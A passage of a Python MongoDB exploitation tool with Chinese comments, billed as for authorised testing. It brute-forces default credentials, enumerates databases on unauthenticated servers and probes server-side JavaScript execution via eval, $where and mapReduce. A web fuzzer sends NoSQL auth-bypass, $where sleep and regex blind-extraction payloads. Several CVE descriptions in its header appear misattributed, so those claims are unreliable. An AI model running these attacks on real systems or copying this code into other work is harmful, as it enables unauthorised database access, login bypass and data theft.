#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MongoDB 综合漏洞检测/利用脚本 v1.0
覆盖 未授权访问 / 弱口令爆破 / NoSQL 注入 / $where JS RCE / 信息泄露
仅用于授权安全测试 / 靶场验证

攻击模式:
  check  — 综合漏洞检测 (默认)
  rce    — $where JavaScript 代码执行
  shell  — 交互式利用 Shell
  nosql  — NoSQL 注入 Fuzzing

CVE 覆盖:
  CVE-2021-20330   — $where / mapReduce 服务端 JS 注入 RCE (CVSS 8.8, MongoDB < 5.0)
  CVE-2016-6494    — mongod 本地提权 (CVSS 7.8)
  无 CVE           — 未授权访问 (默认无密码绑定 0.0.0.0, 全球约 50000+ 暴露实例)
  无 CVE           — NoSQL 注入 ($gt / $ne / $regex 绕过认证, 盲注提取)
  无 CVE           — 弱口令爆破
  无 CVE           — 数据库/集合/文档信息泄露
"""

import socket
import struct
import sys
import argparse
import re
import random
import string
import hashlib
import hmac
import time
import json
import base64
from typing import Optional, Tuple, List, Dict, Any

# ============== 依赖检查 ==============

try:
    from pymongo import MongoClient
    from pymongo.errors import (
        ConnectionFailure, OperationFailure, ServerSelectionTimeoutError,
        PyMongoError, ConfigurationError
    )
    HAS_PYMONGO = True
except ImportError:
    HAS_PYMONGO = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║     MongoDB 综合漏洞检测/利用工具 v1.0                            ║
║     未授权访问 / NoSQL注入 / JS RCE / 弱口令 | 仅限授权安全使用  ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def _banner_warn():
    safe_print(f"""
{C.RED}{C.BLD}
┌──────────────────────────────────────────────────────────────┐
│  WARNING: 本工具仅用于合法授权的安全测试                        │
│  未经授权对目标系统进行测试属于违法行为                          │
└──────────────────────────────────────────────────────────────┘
{C.RST}""")


# ============== 轻量 MongoDB 客户端 (无 pymongo 回退) ==============

# MongoDB Wire Protocol 操作码
OP_REPLY = 1
OP_UPDATE = 2001
OP_INSERT = 2002
OP_QUERY = 2004
OP_GET_MORE = 2005
OP_DELETE = 2006
OP_KILL_CURSORS = 2007
OP_MSG = 2013

# SCRAM 认证常量
SCRAM_MECHANISMS = ['SCRAM-SHA-256', 'SCRAM-SHA-1']


class MongoWireClient:
    """基于 MongoDB Wire Protocol 的轻量客户端 (无需 pymongo)"""

    def __init__(self, host: str, port: int = 27017, username: str = '',
                 password: str = '', auth_db: str = 'admin',
                 timeout: int = 10):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.auth_db = auth_db
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self._request_id = 0
        self._cursor_id = 0
        self._authenticated = False
        self._build_info = {}
        self._server_version = None

    def _next_id(self) -> int:
        self._request_id += 1
        return self._request_id

    def _send_msg(self, op_code: int, body: bytes) -> None:
        msg_len = 16 + len(body)
        header = struct.pack(
            '<iiii', msg_len, self._next_id(), 0, op_code
        )
        self.sock.sendall(header + body)

    def _recv_msg(self, timeout: int = None) -> Tuple[int, int, bytes]:
        """返回 (length, request_id, response_to, op_code, body)"""
        t = timeout or self.timeout
        self.sock.settimeout(t)
        raw = b''
        while len(raw) < 16:
            chunk = self.sock.recv(16 - len(raw))
            if not chunk:
                raise ConnectionError('连接已关闭')
            raw += chunk
        msg_len, req_id, resp_to, op_code = struct.unpack('<iiii', raw)
        body_len = msg_len - 16
        while len(raw) < msg_len:
            chunk = self.sock.recv(msg_len - len(raw))
            if not chunk:
                raise ConnectionError('连接中断')
            raw += chunk
        return op_code, raw[16:]

    def build_query(self, collection: str, query: dict,
                    num_to_skip: int = 0, num_to_return: int = 1) -> bytes:
        """构建 OP_QUERY 消息体"""
        flags = 0
        full_collection = collection  # e.g., "admin.$cmd"
        query_bson = _encode_bson(query)
        body = struct.pack('<ii', flags, 0)  # flags, full_collection_name (will follow)
        # 实际上这里简化使用了 $cmd 方式
        body += full_collection.encode('utf-8') + b'\x00'
        body += struct.pack('<ii', num_to_skip, num_to_return)
        body += query_bson
        return body

    def admin_command(self, cmd: dict) -> Optional[dict]:
        """通过 admin.$cmd 发送命令 (不认证)"""
        try:
            body = b''
            body += struct.pack('<i', 0)  # flags
            body += b'admin.$cmd\x00'
            body += struct.pack('<ii', 0, 1)  # skip, return
            body += _encode_bson(cmd)
            self._send_msg(OP_QUERY, body)
            op_code, resp_body = self._recv_msg(timeout=5)
            if op_code == OP_REPLY:
                flags = struct.unpack('<i', resp_body[:4])[0]
                cursor_id = struct.unpack('<q', resp_body[4:12])[0]
                starting_from = struct.unpack('<i', resp_body[12:16])[0]
                num_docs = struct.unpack('<i', resp_body[16:20])[0]
                docs = _decode_bson_multi(resp_body[20:], num_docs)
                return docs[0] if docs else None
        except Exception:
            pass
        return None

    def connect(self) -> bool:
        """建立 TCP 连接"""
        try:
            self.sock = socket.create_connection(
                (self.host, self.port), timeout=self.timeout
            )
            self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            return True
        except socket.timeout:
            safe_print(f"  {C.RED}[-] 连接超时{C.RST}")
            return False
        except ConnectionRefusedError:
            safe_print(f"  {C.RED}[-] 连接被拒绝{C.RST}")
            return False
        except Exception as e:
            safe_print(f"  {C.RED}[-] 连接失败: {e}{C.RST}")
            return False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None

    def get_build_info(self) -> dict:
        try:
            result = self.admin_command({'buildInfo': 1})
            if result:
                self._build_info = result
                self._server_version = result.get('version', '')
            return result or {}
        except Exception:
            return {}

    def get_server_version(self) -> str:
        if not self._server_version:
            self.get_build_info()
        return self._server_version or 'unknown'


# ============== 极简 BSON 编解码 (仅支持常用类型) ==============

def _encode_element(key: str, value: Any) -> bytes:
    result = b''
    if isinstance(value, str):
        result += b'\x02' + key.encode('utf-8') + b'\x00'
        v = value.encode('utf-8') + b'\x00'
        result += struct.pack('<i', len(v)) + v
    elif isinstance(value, int) and -2147483648 <= value <= 2147483647:
        result += b'\x10' + key.encode('utf-8') + b'\x00'
        result += struct.pack('<i', value)
    elif isinstance(value, int):
        result += b'\x12' + key.encode('utf-8') + b'\x00'
        result += struct.pack('<q', value)
    elif isinstance(value, float):
        result += b'\x01' + key.encode('utf-8') + b'\x00'
        result += struct.pack('<d', value)
    elif isinstance(value, bool):
        result += b'\x08' + key.encode('utf-8') + b'\x00'
        result += b'\x01' if value else b'\x00'
    elif value is None:
        result += b'\x0a' + key.encode('utf-8') + b'\x00'
    elif isinstance(value, dict):
        result += b'\x03' + key.encode('utf-8') + b'\x00'
        inner = _encode_bson(value)
        result += struct.pack('<i', len(inner) + 4) + inner
    elif isinstance(value, list):
        result += b'\x04' + key.encode('utf-8') + b'\x00'
        inner = b''
        for i, item in enumerate(value):
            inner += _encode_element(str(i), item)
        inner += b'\x00'
        result += struct.pack('<i', len(inner) + 4) + inner
    return result


def _encode_bson(doc: dict) -> bytes:
    body = b''
    for k, v in doc.items():
        body += _encode_element(k, v)
    body += b'\x00'
    return struct.pack('<i', len(body) + 4) + body


def _decode_bson(data: bytes) -> Tuple[dict, int]:
    """解码单个 BSON 文档, 返回 (doc, consumed)"""
    if len(data) < 4:
        return {}, 0
    doc_len = struct.unpack('<i', data[:4])[0]
    if len(data) < doc_len:
        return {}, 0
    doc = {}
    pos = 4
    while pos < doc_len - 1:
        el_type = data[pos]
        pos += 1
        key_end = data.find(b'\x00', pos)
        key = data[pos:key_end].decode('utf-8', errors='replace')
        pos = key_end + 1

        if el_type == 0x02:  # string
            s_len = struct.unpack('<i', data[pos:pos + 4])[0]
            pos += 4
            doc[key] = data[pos:pos + s_len - 1].decode('utf-8', errors='replace')
            pos += s_len
        elif el_type == 0x10:  # int32
            doc[key] = struct.unpack('<i', data[pos:pos + 4])[0]
            pos += 4
        elif el_type == 0x12:  # int64
            doc[key] = struct.unpack('<q', data[pos:pos + 8])[0]
            pos += 8
        elif el_type == 0x01:  # double
            doc[key] = struct.unpack('<d', data[pos:pos + 8])[0]
            pos += 8
        elif el_type == 0x08:  # bool
            doc[key] = data[pos] != 0
            pos += 1
        elif el_type == 0x0a:  # null
            doc[key] = None
        elif el_type == 0x03:  # embedded document
            inner_doc, consumed = _decode_bson(data[pos - 1:])
            doc[key] = inner_doc
            pos += consumed - 1
        elif el_type == 0x04:  # array
            inner_doc, consumed = _decode_bson(data[pos - 1:])
            doc[key] = list(inner_doc.values())
            pos += consumed - 1
        elif el_type == 0x11 or el_type == 0x12:  # timestamp datetime
            doc[key] = struct.unpack('<q', data[pos:pos + 8])[0]
            pos += 8
        elif el_type == 0x05:  # binary
            b_len = struct.unpack('<i', data[pos:pos + 4])[0]
            pos += 4
            doc[key] = data[pos + 1:pos + b_len]  # skip subtype
            pos += b_len
        elif el_type == 0x13:  # regex
            pat_end = data.find(b'\x00', pos)
            pattern = data[pos:pat_end].decode('utf-8', errors='replace')
            pos = pat_end + 1
            opt_end = data.find(b'\x00', pos)
            options = data[pos:opt_end].decode('utf-8', errors='replace')
            pos = opt_end + 1
            doc[key] = {'$regex': pattern, '$options': options}
        else:
            pos = doc_len  # skip unknown
    return doc, doc_len


def _decode_bson_multi(data: bytes, count: int = 1) -> List[dict]:
    docs = []
    pos = 0
    for _ in range(count):
        doc, consumed = _decode_bson(data[pos:])
        if consumed == 0:
            break
        docs.append(doc)
        pos += consumed
    return docs


# ============== pymongo 封装客户端 ==============

class MongoCheckClient:
    """基于 pymongo 的 MongoDB 客户端"""

    def __init__(self, host: str, port: int = 27017, username: str = '',
                 password: str = '', auth_db: str = 'admin',
                 timeout: int = 10):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.auth_db = auth_db
        self.timeout = timeout
        self.client: Optional[MongoClient] = None
        self._authenticated = False
        self._is_arbiter = False
        self._server_info = {}
        self._build_info = {}

    def connect(self, direct: bool = True) -> bool:
        """建立连接"""
        try:
            uri = f'mongodb://{self.host}:{self.port}/'
            if self.username and self.password:
                uri = (
                    f'mongodb://{self.username}:{self.password}'
                    f'@{self.host}:{self.port}/{self.auth_db}'
                )
            self.client = MongoClient(
                uri,
                serverSelectionTimeoutMS=self.timeout * 1000,
                connectTimeoutMS=self.timeout * 1000,
                socketTimeoutMS=self.timeout * 1000,
                directConnection=direct,
            )
            self.client.admin.command('ping')
            return True
        except (ConnectionFailure, ServerSelectionTimeoutError) as e:
            # 可能是 ReplicaSet, 尝试 non-direct 连接
            if direct:
                return self.connect(direct=False)
            safe_print(f"  {C.RED}[-] 连接失败: {e}{C.RST}")
            return False
        except OperationFailure as e:
            err = str(e)
            if 'Authentication failed' in err:
                safe_print(f"  {C.YLW}[!] 认证失败{C.RST}")
                return False
            if 'not authorized' in err:
                # 连接成功但无权限, 仍算连接成功 (未授权访问)
                return True
            safe_print(f"  {C.RED}[-] 连接异常: {err[:100]}{C.RST}")
            return False
        except Exception as e:
            safe_print(f"  {C.RED}[-] 连接错误: {e}{C.RST}")
            return False

    def get_server_info(self) -> dict:
        if self._server_info:
            return self._server_info
        try:
            db = self.client.get_database('admin')
            self._server_info = db.command('serverStatus')
            self._build_info = db.command('buildInfo')
        except Exception:
            pass
        return self._server_info

    def get_build_info(self) -> dict:
        if self._build_info:
            return self._build_info
        try:
            self._build_info = self.client.admin.command('buildInfo')
        except Exception:
            pass
        return self._build_info

    def get_version(self) -> str:
        info = self.get_build_info()
        return info.get('version', 'unknown')

    def list_databases(self) -> List[dict]:
        try:
            return list(self.client.admin.command('listDatabases').get('databases', []))
        except Exception:
            try:
                db_names = self.client.list_database_names()
                return [{'name': n, 'sizeOnDisk': 0} for n in db_names]
            except Exception:
                return []

    def list_collections(self, db_name: str) -> List[str]:
        try:
            db = self.client.get_database(db_name)
            return db.list_collection_names()
        except Exception:
            return []

    def count_documents(self, db_name: str, col_name: str) -> int:
        try:
            db = self.client.get_database(db_name)
            return db.get_collection(col_name).estimated_document_count()
        except Exception:
            return 0

    def find_documents(self, db_name: str, col_name: str,
                       limit: int = 5) -> List[dict]:
        try:
            db = self.client.get_database(db_name)
            docs = list(db.get_collection(col_name).find().limit(limit))
            return docs
        except Exception:
            return []

    def get_roles(self) -> List[dict]:
        """获取当前用户的角色 (认证后)"""
        try:
            db = self.client.get_database('admin')
            return list(db.command('usersInfo', {'user': self.username,
                                                 'db': self.auth_db}).get('users', []))
        except Exception:
            return []

    def eval_js(self, js_code: str, args: dict = None) -> Any:
        """执行 JavaScript (MongoDB < 5.0, 需要相应权限)"""
        # 尝试多种执行方式
        # 方法 1: $where (需要目标集合)
        # 方法 2: mapReduce
        # 方法 3: eval/server-side JS
        results = []

        # 方式 1: db.eval (已废弃但老版本可用, MongoDB < 4.2)
        try:
            db = self.client.get_database('admin')
            result = db.command('eval', js_code, args=(args or {}), nolock=True)
            if result.get('ok') == 1:
                return result.get('retval', result)
        except OperationFailure as e:
            if 'eval' in str(e).lower() or 'not authorized' in str(e).lower():
                pass
            else:
                results.append(f'eval异常: {e}')
        except Exception as e:
            results.append(f'eval: {e}')

        # 方式 2: $where 注入 (需有写权限的库)
        try:
            db = self.client.get_database('admin')
            col = db.get_collection('system.version')
            doc = col.find_one({'$where': js_code})
            if doc:
                return doc
        except OperationFailure as e:
            results.append(f'$where: {e}')
        except Exception:
            pass

        # 方式 3: mapReduce
        try:
            db = self.client.get_database('admin')
            col = db.get_collection('system.version')
            result = db.command({
                'mapReduce': 'system.version',
                'map': f'function() {{ {js_code} }}',
                'reduce': 'function(k,v) { return v; }',
                'out': {'inline': 1},
            })
            if result.get('ok') == 1:
                return result
        except Exception as e:
            results.append(f'mapReduce: {e}')

        return results if results else None

    def close(self):
        if self.client:
            try:
                self.client.close()
            except Exception:
                pass
            self.client = None


# ============== 0. 指纹检测 ==============

def detect_mongodb_raw(host: str, port: int = 27017, timeout: int = 10) -> Tuple[bool, dict]:
    """通过 Wire Protocol 原始探测 MongoDB (无需 pymongo)"""
    info: dict = {}

    wc = MongoWireClient(host, port, timeout=timeout)
    if not wc.connect():
        return False, info

    try:
        # 发 buildInfo 命令
        build_info = wc.get_build_info()
        if build_info:
            info['version'] = build_info.get('version', 'unknown')
            info['gitVersion'] = build_info.get('gitVersion', '')
            info['bits'] = build_info.get('bits', '')
            info['detected'] = True

            # 发 isMaster 获取更多信息
            try:
                ismaster = wc.admin_command({'isMaster': 1})
                if ismaster:
                    info['ismaster'] = ismaster
                    info['is_arbiter'] = ismaster.get('arbiterOnly', False)
                    info['set_name'] = ismaster.get('setName', '')
            except Exception:
                pass

            return True, info
        else:
            # 没有 buildInfo 回包, 可能是其他服务
            return False, info
    except Exception:
        return False, info
    finally:
        wc.close()


def detect_mongodb_pymongo(host: str, port: int = 27017,
                           timeout: int = 10) -> Tuple[bool, dict]:
    """通过 pymongo 指纹检测"""
    info: dict = {}
    client = MongoCheckClient(host, port, timeout=timeout)

    if not client.connect():
        return False, info

    try:
        server_info = client.get_server_info()
        build_info = client.get_build_info()

        info['version'] = build_info.get('version', 'unknown')
        info['gitVersion'] = build_info.get('gitVersion', '')
        info['bits'] = build_info.get('bits', '')
        info['OpenSSLVersion'] = build_info.get('openssl', {}).get('running', '')
        info['javascriptEngine'] = build_info.get('javascriptEngine', '')

        # serverStatus
        info['uptime'] = server_info.get('uptime', 0)
        info['connections'] = server_info.get('connections', {})
        info['host'] = server_info.get('host', '')
        info['process'] = server_info.get('process', '')
        info['pid'] = server_info.get('pid', 0)

        # isMaster
        try:
            ismaster = client.client.admin.command('ismaster')
            info['is_arbiter'] = ismaster.get('arbiterOnly', False)
            info['set_name'] = ismaster.get('setName', '')
            info['is_replica'] = bool(ismaster.get('setName'))
        except Exception:
            pass

        return True, info
    except Exception as e:
        safe_print(f"  {C.YLW}[!] 获取信息失败: {e}{C.RST}")
        return True, info  # 连上了就算检测到
    finally:
        client.close()


def detect_mongodb(host: str, port: int = 27017,
                   timeout: int = 10) -> Tuple[bool, dict]:
    """综合指纹检测"""
    safe_print(f"\n{C.YLW}[0] 指纹检测{C.RST}")

    if HAS_PYMONGO:
        ok, info = detect_mongodb_pymongo(host, port, timeout)
    else:
        ok, info = detect_mongodb_raw(host, port, timeout)

    if ok:
        safe_print(f"  {C.GRN}[+] 确认 MongoDB{C.RST}")
        if info.get('version'):
            safe_print(f"  {C.GRN}    版本: {info['version']} "
                       f"({'ReplicaSet' if info.get('is_replica') else 'Standalone'}){C.RST}")
        if info.get('gitVersion'):
            safe_print(f"  {C.GRN}    Git: {info['gitVersion'][:16]}...{C.RST}")
        if info.get('uptime'):
            days = info['uptime'] // 86400
            hours = (info['uptime'] % 86400) // 3600
            safe_print(f"  {C.GRN}    运行时间: {days}d {hours}h{C.RST}")
    else:
        safe_print(f"  {C.RED}[-] 未检测到 MongoDB 服务{C.RST}")

    return ok, info


# ============== 1. 未授权访问检测 ==============

def check_unauthorized_access(host: str, port: int = 27017,
                              timeout: int = 10) -> Tuple[bool, dict]:
    """检测未授权访问 (无需密码即可操作)"""
    safe_print(f"\n{C.YLW}[1] 未授权访问检测{C.RST}")

    info: dict = {}

    if not HAS_PYMONGO:
        safe_print(f"  {C.YLW}[!] 需要 pymongo 库, 跳过深入检测{C.RST}")
        # 用 Wire Protocol 快速探测 buildInfo 是否可访问
        wc = MongoWireClient(host, port, timeout=timeout)
        if wc.connect():
            bi = wc.get_build_info()
            wc.close()
            if bi:
                safe_print(f"  {C.RED}[!] 未授权可获取 buildInfo — 可能无需认证{C.RST}")
                info['unauthenticated'] = True
                return True, info
        return False, info

    # 不带凭据连接
    client = MongoCheckClient(host, port, timeout=timeout)
    if not client.connect():
        safe_print(f"  {C.GRN}[+] 无认证无法连接 (已启用认证){C.RST}")
        return False, info

    safe_print(f"  {C.RED}[!] MongoDB 未授权访问! 无需密码即可连接{C.RST}")

    info['unauthenticated'] = True

    # 枚举数据库
    dbs = client.list_databases()
    if dbs:
        safe_print(f"  {C.RED}    数据库: {len(dbs)} 个{C.RST}")
        total_size = sum(db.get('sizeOnDisk', 0) for db in dbs)
        info['database_count'] = len(dbs)
        info['total_size_mb'] = total_size // (1024 * 1024)

        for db_info in dbs[:12]:
            name = db_info.get('name', '?')
            size = db_info.get('sizeOnDisk', 0) // (1024 * 1024) or 1
            safe_print(f"  {C.YLW}      {name} ({size}MB){C.RST}")

            # 每个库列举集合数
            cols = client.list_collections(name)
            safe_print(f"  {C.CYN}        └─ 集合: {len(cols):<4} {cols[:6]}{'...' if len(cols) > 6 else ''}{C.RST}")

    # 检查是否是 arbiter
    info['is_arbiter'] = False
    try:
        ismaster = client.client.admin.command('ismaster')
        if ismaster.get('arbiterOnly'):
            info['is_arbiter'] = True
            safe_print(f"  {C.CYN}    节点类型: Arbiter (无数据){C.RST}")
    except Exception:
        pass

    # 查看日志和配置
    try:
        log = client.client.admin.command('getLog', 'global')
        if log and log.get('log'):
            size = len('\n'.join(log['log']))
            safe_print(f"  {C.YLW}    日志可读 ({size} 字符){C.RST}")
            info['log_readable'] = True
    except Exception:
        pass

    client.close()
    return True, info


# ============== 2. 弱口令爆破 ==============

MONGO_DEFAULT_CREDS = [
    ('admin', 'admin'),
    ('admin', '123456'),
    ('admin', 'password'),
    ('root', 'root'),
    ('root', 'toor'),
    ('mongodb', 'mongodb'),
    ('mongodb', 'password'),
    ('admin', 'mongodb'),
    ('admin', ''),
    ('test', 'test'),
    ('user', 'user'),
    ('dbadmin', 'dbadmin'),
    ('mongoadmin', 'secret'),
]

MONGO_AUTH_DBS = ['admin', 'config', 'local']


def check_weak_credentials(host: str, port: int = 27017,
                           timeout: int = 10) -> Tuple[List[str], str, str, str]:
    """弱口令爆破"""
    safe_print(f"\n{C.YLW}[2] 弱口令 / 默认凭据检测{C.RST}")

    if not HAS_PYMONGO:
        safe_print(f"  {C.YLW}[!] 需要 pymongo 库, 跳过{C.RST}")
        return [], '', '', ''

    found_user, found_pass, found_db = '', '', ''
    working = []

    for user, pwd in MONGO_DEFAULT_CREDS:
        for auth_db in MONGO_AUTH_DBS:
            try:
                client = MongoCheckClient(host, port, user, pwd, auth_db, timeout)
                if client.connect():
                    # 验证可获取信息
                    try:
                        ver = client.get_version()
                        safe_print(f"  {C.RED}[!] 有效凭据: {user}:{pwd}@{auth_db} "
                                   f"(版本: {ver}){C.RST}")
                        working.append(f'{user}:{pwd}@{auth_db}')
                        found_user, found_pass, found_db = user, pwd, auth_db
                    except Exception:
                        pass
                    client.close()
            except Exception:
                pass

    if not working:
        safe_print(f"  {C.CYN}[-] 常见弱口令未命中{C.RST}")

    return working, found_user, found_pass, found_db


# ============== 3. CVE-2021-20330 — $where JS RCE ==============

def check_cve_2021_20330(host: str, port: int = 27017,
                         username: str = '', password: str = '',
                         auth_db: str = 'admin',
                         timeout: int = 10) -> Tuple[bool, str]:
    """
    CVE-2021-20330: $where / mapReduce / eval 等 JS 执行环境中
    MongoDB 对传入的 JS 代码过滤不严，导致服务端代码注入 RCE。
    影响: MongoDB < 5.0 (enableTestCommands=1 时更严重)
    前提: 需要对某个数据库有写/读权限
    """
    safe_print(f"\n{C.YLW}[3] CVE-2021-20330: $where JS 注入 RCE (CVSS 8.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: MongoDB < 5.0 | 需认证 | 服务端 JS 注入{C.RST}")

    if not HAS_PYMONGO:
        safe_print(f"  {C.YLW}[!] 需要 pymongo 库{C.RST}")
        return False, ''

    client = MongoCheckClient(host, port, username, password, auth_db, timeout)
    if not client.connect():
        safe_print(f"  {C.RED}[-] 连接失败{C.RST}")
        return False, ''

    version = client.get_version()
    safe_print(f"  版本: {version}")

    # 检查是否是易受攻击的版本
    try:
        ver_parts = version.split('.')
        major = int(ver_parts[0])
        minor = int(ver_parts[1]) if len(ver_parts) > 1 else 0
        if major >= 5:
            safe_print(f"  {C.GRN}[+] 版本 >= 5.0, CVE-2021-20330 可能已修复{C.RST}")
    except Exception:
        pass

    # 检测 JavaScript 引擎可用性
    build_info = client.get_build_info()
    js_engine = build_info.get('javascriptEngine', 'none')
    safe_print(f"  {C.CYN}    JS 引擎: {js_engine}{C.RST}")

    if js_engine == 'none' or not js_engine:
        safe_print(f"  {C.GRN}[+] JS 引擎未启用, 不受影响{C.RST}")
        client.close()
        return False, ''

    # 测试 JS 执行: 先尝试 harmless eval
    rk = randstr(6)
    test_js = f'function() {{ return "{rk}"; }}'

    safe_print(f"  {C.CYN}[*] 测试 JS 执行能力...{C.RST}")

    # 方式 1: eval
    try:
        db = client.client.get_database('admin')
        result = db.command('eval', f'return "{rk}";', nolock=True)
        if result.get('ok') == 1 and rk in str(result):
            safe_print(f"  {C.RED}[!] db.eval() 可用! 可执行任意 JavaScript{C.RST}")
            safe_print(f"  {C.RED}    CVE-2021-20330 确认存在{C.RST}")
            client.close()
            return True, 'eval'
    except OperationFailure as e:
        safe_print(f"  {C.CYN}    eval 不可用: {str(e)[:80]}{C.RST}")
    except Exception as e:
        safe_print(f"  {C.CYN}    eval 异常: {e}{C.RST}")

    # 方式 2: $where
    try:
        db = client.client.get_database('admin')
        col = db.get_collection('system.version')
        list(col.find({'$where': f'function() {{ return "{rk}" == "{rk}"; }}'}).limit(1))
        safe_print(f"  {C.RED}[!] $where 可用! CVE-2021-20330 可能存在{C.RST}")
        client.close()
        return True, '$where'
    except Exception:
        safe_print(f"  {C.CYN}    $where 受限或不可用{C.RST}")

    client.close()
    safe_print(f"  {C.CYN}[-] 未发现可直接利用的 JS 执行路径{C.RST}")
    return False, ''


# ============== 4. NoSQL 注入检测 (Web App 上下文) ==============

NOSQL_INJECTION_PAYLOADS = {
    'auth_bypass_ne': {'username': {'$ne': ''}, 'password': {'$ne': ''}},
    'auth_bypass_gt': {'username': {'$gt': ''}, 'password': {'$gt': ''}},
    'auth_bypass_regex': {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
    'auth_bypass_in': {'username': {'$in': ['admin', 'root']}, 'password': {'$ne': ''}},
    'auth_bypass_and': {
        '$and': [
            {'username': {'$ne': ''}},
            {'password': {'$ne': ''}}
        ]
    },
    'timing_blind': {
        'username': {'$regex': '^a'},
        '$where': 'sleep(5000) || true'
    },
    'error_extract': {
        'username': {'$regex': '^a'},
        'password': {'$eq': 1}
    },
}


def nosql_injection_fuzzer(target_url: str, param: str = 'username',
                           method: str = 'POST', timeout: int = 10,
                           proxy: str = None,
                           extra_headers: dict = None) -> dict:
    """
    NoSQL 注入 Fuzzer — 针对 Web 应用后端使用 MongoDB 的场景。
    支持 JSON POST 和 URL-encoded 表单。

    攻击类型:
      - 认证绕过 ($ne, $gt, $regex, $in)
      - 布尔盲注 ($regex 逐字符提取)
      - 时间盲注 ($where sleep)
      - 错误注入 ($eq 类型混淆)
    """
    results = {}

    if not HAS_REQUESTS:
        safe_print(f"{C.RED}[-] 需要 requests 库, 跳过 NoSQL Fuzzer{C.RST}")
        return results

    safe_print(f"\n{C.YLW}[4] NoSQL 注入 Fuzzer (Web App 上下文){C.RST}")
    safe_print(f"  {C.CYN}    目标: {target_url}{C.RST}")
    safe_print(f"  {C.CYN}    HTTP 方法: {method} | 参数: {param}{C.RST}")

    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/json',
    })
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    if extra_headers:
        s.headers.update(extra_headers)

    # 1. 获取基线
    baseline_body = {param: 'nonexistent_user_test_xyz'}
    try:
        if method.upper() == 'POST':
            r = s.post(target_url, json=baseline_body, timeout=timeout)
        else:
            r = s.get(target_url, params=baseline_body, timeout=timeout)
        baseline_status = r.status_code
        baseline_len = len(r.text)
        baseline_text = r.text
        safe_print(f"  {C.CYN}    基线: HTTP {baseline_status}, {baseline_len} 字节{C.RST}")
    except Exception as e:
        safe_print(f"  {C.RED}[-] 无法访问目标: {e}{C.RST}")
        return results

    # 2. 测试各类 NoSQL 注入
    for attack_name, payload in NOSQL_INJECTION_PAYLOADS.items():
        try:
            body = {param: payload}
            if method.upper() == 'POST':
                r = s.post(target_url, json=body, timeout=timeout)
            else:
                r = s.get(target_url, params={param: json.dumps(payload)}, timeout=timeout)

            text_differs = len(r.text) != baseline_len
            status_differs = r.status_code != baseline_status

            if status_differs or text_differs:
                safe_print(f"  {C.RED}[!] {attack_name}: HTTP {r.status_code}, "
                           f"{len(r.text)} 字节 "
                           f"({'状态码变化' if status_differs else ''}"
                           f"{' 内容变化' if text_differs else ''}){C.RST}")

                # 判断是否认证绕过 (通常返回 200 + 包含会话信息)
                if r.status_code == 200 and ('token' in r.text.lower() or
                                              'session' in r.text.lower() or
                                              'success' in r.text.lower()):
                    safe_print(f"  {C.RED}[!!!] 可能认证绕过!{C.RST}")
                    results[attack_name] = {'type': 'auth_bypass', 'status': r.status_code}

                # 判断错误注入
                elif r.status_code == 500 or 'error' in r.text.lower():
                    safe_print(f"  {C.YLW}[*] 可能错误注入 — 检查响应详情{C.RST}")
                    results[attack_name] = {'type': 'error_based', 'status': r.status_code}

                # 其他异常
                else:
                    results[attack_name] = {'type': 'anomaly', 'status': r.status_code}
            else:
                safe_print(f"  {C.CYN}    {attack_name}: 无变化{C.RST}")

        except Exception as e:
            safe_print(f"  {C.YLW}    {attack_name}: 请求失败 ({e}){C.RST}")

    # 3. 布尔盲注 — 逐字符测试
    if results:
        safe_print(f"\n  {C.YLW}[*] 尝试布尔盲注 (逐字符), 最多 20 字符...{C.RST}")
        extracted = ""
        charset = string.ascii_letters + string.digits + '_'

        for pos in range(20):
            found = False
            for ch in charset:
                payload = {
                    param: {'$regex': f'^{extracted}{re.escape(ch)}'}
                }
                try:
                    if method.upper() == 'POST':
                        r = s.post(target_url, json=payload, timeout=timeout)
                    else:
                        r = s.get(target_url, params={param: json.dumps(payload)}, timeout=timeout)

                    if len(r.text) != baseline_len or r.status_code != baseline_status:
                        extracted += ch
                        safe_print(f"  {C.GRN}    [{pos}] '{extracted}'{C.RST}")
                        found = True
                        break
                except Exception:
                    break
            if not found:
                break

        if extracted:
            safe_print(f"  {C.RED}[!] 盲注提取结果: {extracted}{C.RST}")
            results['blind_extraction'] = extracted

    # 打印结论
    safe_print(f"\n  {C.BLD}NoSQL 注入检测结论:{C.RST}")
    findings = [k for k, v in results.items() if v.get('type') == 'auth_bypass']
    if findings:
        safe_print(f"  {C.RED}[!] 确认 NoSQL 注入 — 认证绕过 ({', '.join(findings)}){C.RST}")
    elif results:
        safe_print(f"  {C.YLW}[!] 存在异常响应 — 需要进一步分析{C.RST}")
    else:
        safe_print(f"  {C.CYN}[-] 未发现明显 NoSQL 注入{C.RST}")

    return results


# ============== 5. 信息泄露审计 ==============

def check_info_disclosure(host: str, port: int = 27017,
                          timeout: int = 10) -> List[str]:
    """信息泄露 / 配置审计 (需要 pymongo)"""
    safe_print(f"\n{C.YLW}[5] 信息泄露 / 配置审计{C.RST}")
    hits = []

    if not HAS_PYMONGO:
        safe_print(f"  {C.YLW}[!] 需要 pymongo 库，跳过{C.RST}")
        return hits

    client = MongoCheckClient(host, port, timeout=timeout)
    if not client.connect():
        return hits

